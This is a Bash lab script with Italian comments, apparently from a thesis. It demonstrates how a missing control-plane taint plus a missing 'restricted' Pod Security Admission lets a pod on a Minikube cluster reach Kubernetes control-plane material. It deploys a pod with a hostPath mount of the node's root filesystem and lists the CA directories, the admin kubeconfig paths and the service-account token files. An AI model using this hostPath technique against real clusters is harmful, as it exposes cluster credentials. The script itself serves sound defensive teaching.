#!/usr/bin/env bash
# =============================================================================
# Attacco dimostrativo A2 - Dal foothold co-locato al control plane
#
# MODELLO DI ATTACCANTE (vedi security-demos/README.md)
#   - OUTSIDER che ha ottenuto un foothold nel pod applicativo ESPOSTO (come in
#     04: via una vulnerabilita' applicativa; in laboratorio il foothold e'
#     rappresentato con 'kubectl exec' nel pod di prova).
#   - ZERO-KNOWLEDGE: non sa come e' schedulato il cluster ne' quali policy
#     esistono; lo scopre sondando.
#   - PRIVILEGI MINIMI: dentro il pod usa solo cio' che il pod stesso espone.
#     Non crea risorse, non e' admin.
#
# OBIETTIVO: mostrare se e come, da un foothold nel pod esposto, l'attaccante
# "mette mano" nel CONTROL PLANE. Il punto scientifico, da scrivere in tesi:
#
#   la co-locazione sul nodo di controllo, DA SOLA, NON basta. Un pod normale
#   resta isolato (namespace, no host fs, no host loopback). Per raggiungere il
#   control plane servono DUE policy mancanti insieme:
#     (1) nessun TAINT -> il pod applicativo finisce sul nodo di controllo;
#     (2) nessuna Pod Security Admission 'restricted' -> al pod e' permesso un
#         mount pericoloso (hostPath) / hostNetwork / privilegi.
#   Con entrambe mancanti, il foothold legge il materiale del control plane
#   (CA, kubeconfig admin) dal filesystem del nodo. Con una qualsiasi delle due
#   presenti, la catena si ferma. IL FOCUS E' LA MANCANZA DI POLICY.
#
# Il pod di laboratorio 'lab-cp-foothold' MODELLA il workload esposto in una
# configurazione vulnerabile (niente taint che lo tenga fuori, niente PSA che gli
# vieti hostPath). E' un artefatto di laboratorio, rimosso a fine run. La prova
# d'impatto e' SOLO 'ls'/conteggi: nessuna chiave o credenziale viene stampata.
#
# Misconfig studiata: STRIDE riga 8, "Workloads scheduled on control-plane nodes".
# Riferimenti: NSA/CISA Kubernetes Hardening Guidance 1.2 (separazione dei
# workload dal control plane; Pod Security); MITRE ATT&CK T1610 "Deploy Container".
#
# Laboratorio DIDATTICO e DIFENSIVO su Minikube. SOLO sul proprio cluster.
#
# Uso:
#   ./05-attacco-control-plane-dos.sh [namespace]            # foothold co-locato -> prova di accesso al CP
# =============================================================================
set -euo pipefail

NS="${1:-smartgrid}"
CP_KEY="node-role.kubernetes.io/control-plane"
FOOTHOLD="lab-cp-foothold"           # modella il workload esposto co-locato sul CP
BUSYBOX_IMAGE="${BUSYBOX_IMAGE:-busybox:1.36}"

line() { printf '\n=== %s\n' "$1"; }
stop() { printf '\n>>> CATENA FERMATA (%s): %s\n' "$1" "$2"; }
need() { command -v "$1" >/dev/null || { echo "serve '$1' nel PATH"; exit 1; }; }
need kubectl
kubectl get ns "$NS" >/dev/null || { echo "namespace '$NS' non trovato"; exit 1; }

CP_NODE="$(kubectl get nodes -l "$CP_KEY" -o jsonpath='{.items[0].metadata.name}' 2>/dev/null || true)"
[ -n "$CP_NODE" ] || { echo "nessun nodo con l'etichetta $CP_KEY"; exit 1; }

cleanup() {
  set +e
  kubectl delete pod "$FOOTHOLD" -n "$NS" --ignore-not-found --grace-period=0 >/dev/null 2>&1
  echo "(pulizia: pod di laboratorio rimosso)"
}
trap cleanup EXIT

echo "MODELLO: outsider con foothold nel pod esposto. Nodo control-plane: $CP_NODE"

# -----------------------------------------------------------------------------
# 1. La VULNERABILITA' e' STRUTTURALE: quali guardrail mancano? (zero-knowledge)
# -----------------------------------------------------------------------------
line "1. Enumero i guardrail MANCANTI (e' qui la vulnerabilita', non nell'attaccante)"
TAINTS="$(kubectl get node "$CP_NODE" -o jsonpath='{range .spec.taints[*]}{.key}:{.effect}{" "}{end}' 2>/dev/null || true)"
echo "-- (1) taint sul nodo control-plane: ${TAINTS:-NESSUNO}"
case " $TAINTS " in
  *" $CP_KEY:NoSchedule "*|*" $CP_KEY:NoExecute "*) echo "        presente: i workload applicativi non entrano sul control plane." ;;
  *) echo "        ASSENTE: un pod applicativo puo' essere schedulato sul control plane." ;;
esac
PSA="$(kubectl get ns "$NS" -o jsonpath='{.metadata.labels.pod-security\.kubernetes\.io/enforce}' 2>/dev/null || true)"
echo "-- (2) Pod Security Admission 'enforce' sul namespace '$NS': ${PSA:-nessuna}"
[ "$PSA" = "restricted" ] && echo "        restricted: hostPath/hostNetwork/privilegi vietati." \
                          || echo "        non 'restricted': al pod e' permesso hostPath/hostNetwork (mount pericolosi)."

# -----------------------------------------------------------------------------
# 2. Il foothold: pod esposto co-locato sul control plane (modella misconfig 2)
# -----------------------------------------------------------------------------
line "2. Foothold nel pod esposto, schedulato sul nodo control-plane"
echo "   (in lab deployo 'lab-cp-foothold' pinnato sul CP con un mount hostPath: modella"
echo "    un workload esposto senza taint ne' PSA che lo limitino)"
kubectl apply -f - >/dev/null <<EOF
apiVersion: v1
kind: Pod
metadata:
  name: $FOOTHOLD
  namespace: $NS
  labels: { app.kubernetes.io/name: lab-cp-foothold }
spec:
  automountServiceAccountToken: false
  terminationGracePeriodSeconds: 0
  nodeSelector: { $CP_KEY: "" }
  tolerations:
  - { key: $CP_KEY, operator: Exists, effect: NoSchedule }
  containers:
  - name: app
    image: $BUSYBOX_IMAGE
    imagePullPolicy: IfNotPresent
    command: ["sh","-c","sleep 300"]
    volumeMounts: [ { name: host, mountPath: /host, readOnly: true } ]
  volumes:
  - { name: host, hostPath: { path: / } }
EOF
kubectl wait pod "$FOOTHOLD" -n "$NS" --for=condition=Ready --timeout=90s >/dev/null 2>&1 || true
NODE="$(kubectl get pod "$FOOTHOLD" -n "$NS" -o jsonpath='{.spec.nodeName}' 2>/dev/null || true)"
echo "   pod schedulato sul nodo: ${NODE:-Pending}"
if [ "$NODE" != "$CP_NODE" ]; then
  stop "passo 2" "il pod NON e' finito sul control plane (taint presente o cluster multinodo)."
  echo "    Senza co-locazione, il foothold non ha accesso al nodo di controllo."
  echo; echo "RISULTATO: catena fermata al passo 2 (il taint tiene i workload fuori)."
  exit 0
fi
echo "   => il workload applicativo gira ACCANTO a etcd/apiserver (misconfig 2 presente)."

# -----------------------------------------------------------------------------
# 3. L'attaccante PROVA a mettere mano nel control plane dal foothold
#    (prova d'accesso in sola lettura: 'ls'/conteggi, nessuna chiave stampata)
# -----------------------------------------------------------------------------
line "3. Dal foothold: si raggiunge il materiale del control plane?"
OUT="$(kubectl exec -n "$NS" "$FOOTHOLD" -- sh -c '
  found=0
  for d in /host/etc/kubernetes/pki /host/var/lib/minikube/certs; do
    if [ -d "$d" ]; then echo "CP_DIR $d"; ls -1 "$d" 2>/dev/null | sed "s/^/  /" | head; found=1; fi
  done
  for f in /host/etc/kubernetes/admin.conf /host/etc/kubernetes/super-admin.conf; do
    [ -f "$f" ] && { echo "CP_KUBECONFIG $f"; found=1; }
  done
  n=$(find /host/var/lib/kubelet/pods -name token 2>/dev/null | wc -l)
  echo "CP_TOKENS $n"
  [ "$found" = 0 ] && echo "CP_NONE"
' 2>/dev/null || echo "EXEC_BLOCKED")"
echo "$OUT" | sed 's/^/   /'
if printf '%s' "$OUT" | grep -q "CP_DIR\|CP_KUBECONFIG"; then
  echo "   => HANDS ON: il foothold legge CA / kubeconfig admin del control plane."
  echo "      Funziona perche' MANCANO insieme il taint (passo 1.1) e la PSA (passo 1.2),"
  echo "      non perche' l'attaccante abbia privilegi. E' il controllo del cluster."
else
  stop "passo 3" "il foothold NON raggiunge il materiale del control plane."
  echo "    (hostPath negato dalla PSA, o percorsi non presenti): l'isolamento regge e"
  echo "    la co-locazione da sola non basta. Impatto residuo possibile: sola contesa"
  echo "    di risorse col control plane (vedi README sez. 2, PriorityClass/quota)."
fi
kubectl delete pod "$FOOTHOLD" -n "$NS" --grace-period=0 >/dev/null 2>&1 || true

echo
echo "CONCLUSIONE: la co-locazione sul control plane diventa accesso al control plane"
echo "SOLO quando mancano INSIEME il taint e la Pod Security Admission. L'attaccante"
echo "resta un outsider con un semplice foothold: a fare il danno e' la mancanza di"
echo "policy. Contromisure: README sez. 2 e security-demos/README.md sez. 2."
